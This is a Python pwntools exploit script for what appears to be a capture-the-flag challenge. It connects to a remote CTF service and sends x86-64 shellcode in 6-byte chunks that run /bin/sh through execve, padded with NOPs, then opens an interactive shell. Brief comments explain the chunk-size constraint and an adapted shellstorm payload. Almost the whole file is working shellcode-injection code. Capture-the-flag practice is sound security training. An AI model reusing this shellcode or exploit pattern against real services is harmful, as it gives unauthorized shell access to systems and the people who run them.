from pwn import *

p = remote('ctf.pwn.sg', 1501)

# The contraints are that each 'part' of shellcode you enter
# is only 6 bytes long. Also, you have to account for the \x00
# instrunction, which is
# 
# add dword[rax], al
# 
# you have to set rax to some valid pointer and never touch it again

# this is basically the shellcode from shellstorm
# but padded with '\x90' and adjused a bit here and there
p.send('\x48\x89\xE8\x90\x90\x90')
p.send('\x48\xC7\xC3\x2F\x73\x68')
p.send('\x00\x48\xC1\xE3\x20\x90')
p.send('\xB9\x2F\x62\x69\x6E\x90')
p.send('\x48\x01\xCB\x90\x90\x90')
p.send('\x53\x48\x89\xE7\x54\x5F')
p.send('\x99\x52\x57\x48\x89\xE6')
p.send('\x54\x5E\x90\x90\x90\x90')
p.send('\x48\x31\xF6\x48\x31\xD2')
p.send('\x31\xC0\xB0\x3B\x0F\x05')

# fill the rest with some bs
for i in range(256-10):
    p.send('\x90'*6)

p.interactive()
